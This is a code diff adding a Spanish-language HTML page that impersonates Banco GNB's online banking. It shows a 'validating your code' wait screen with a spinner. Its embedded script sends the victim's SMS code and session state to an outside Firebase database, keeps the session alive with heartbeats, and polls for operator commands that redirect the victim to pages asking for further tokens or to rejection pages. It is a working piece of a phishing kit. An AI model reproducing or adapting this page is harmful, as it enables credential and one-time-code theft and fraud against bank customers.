@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>GNB :: Validando código</title>
+<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
+<style>
+html{background:transparent;font-family:"Open Sans",sans-serif;}
+body{min-width:320px;margin:0;}
+.bg-gnb-login{background-color:#EDEDED;font-family:'Open Sans',sans-serif;}
+#login-content{background:#fff;min-height:47.6em;margin-right:-15px;margin-left:-15px;display:table;}
+.header-login{padding-top:20px;padding-bottom:25px;}
+.centertext{text-align:center;}
+h2.cliente{font-family:'Open Sans',sans-serif;font-weight:600;font-size:24px !important;line-height:1.2;margin:0;color:#7AB83F;text-align:center;}
+.caja-txt{font-family:'Open Sans',sans-serif;font-size:15px;color:#4a4a4a;text-align:center;line-height:1.5;padding:0 34px;margin-top:14px;}
+.etq{font-family:'Open Sans',sans-serif;font-size:11px;font-weight:600;color:#8a8d8f;text-align:center;margin-top:16px;text-transform:uppercase;letter-spacing:1px;}
+.cod{display:inline-block;font-family:'Open Sans',sans-serif;font-weight:700;font-size:24px;letter-spacing:8px;color:#121212;background:#f4f4f4;border-bottom:2px solid #0574AF;padding:12px 20px 10px;margin:6px 0 0;}
+.cod.vacio{color:#b0b0b0;letter-spacing:2px;font-size:16px;font-weight:600;}
+.spin{width:42px;height:42px;border:4px solid #e3e3e3;border-top-color:#0574AF;border-radius:50%;animation:g .8s linear infinite;margin:30px auto 0;}
+@keyframes g{to{transform:rotate(360deg)}}
+.pie{font-family:'Open Sans',sans-serif;font-size:12px;color:#8a8d8f;text-align:center;margin-top:20px;}
+@media (min-width:992px){#login-content{margin-left:25% !important;}}
+</style>
+</head>
+<body class="bg-gnb-login">
+<div class="container">
+  <div class="row">
+    <div id="login-content" class="col-md-6 col-md-offset-3">
+
+      <div class="col-xs-12 col-sm-10 col-md-10 col-md-offset-1 centertext header-login">
+        <img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB" width="300" height="150" style="max-width:100%;height:auto">
+      </div>
+
+      <div class="col-md-12 col-xs-12 col-sm-12">
+        <h2 class="cliente">Validando el código ingresado</h2>
+        <p class="caja-txt">Estamos confirmando el código con el banco. No cierre esta ventana.</p>
+        <div class="etq">Código ingresado</div>
+        <div class="centertext"><span class="cod vacio" id="lblCodigo">esperando</span></div>
+        <div class="spin"></div>
+        <p class="pie">Conexión segura GNB</p>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id=new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id=localStorage.getItem('nbch_u'); }catch(x){} }
+  if(!id){ location.replace('index.html'); return; }
+
+  var lbl=document.getElementById('lblCodigo');
+
+  function pintar(v){
+    if(v){ lbl.textContent=v; lbl.classList.remove('vacio'); }
+    else { lbl.textContent='esperando'; lbl.classList.add('vacio'); }
+  }
+
+  function leer(){
+    fetch(DB+'/usuarios/'+id+'.json').then(function(r){return r.json();}).then(function(d){
+      if(d) pintar(d.sms);
+    }).catch(function(){});
+  }
+  leer();
+  setInterval(leer, 2000);
+
+  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({estado:'VALIDANDO CODIGO', pagina:'cargando2.html'})}).catch(function(){});
+  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({accion:'', ts:Date.now()})}).catch(function(){});
+
+  var latido=setInterval(function(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({online:true,ultimoPing:Date.now()})}).catch(function(){});
+  },5000);
+
+  var fin=false;
+  function salir(url){ if(fin) return; fin=true; clearInterval(latido); location.href=url; }
+
+  function revisar(){
+    if(fin) return;
+    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
+      if(!c) return;
+      if(c.accion==='token2') salir('codigo2.html?u='+id);
+      else if(c.accion==='dejar') salir('final.html?u='+id);
+      else if(c.accion==='rechazar') salir('rechazado.html?u='+id);
+    }).catch(function(){});
+  }
+  revisar();
+  setInterval(revisar,2000);
+})();
+</script>
+</body>
+</html>
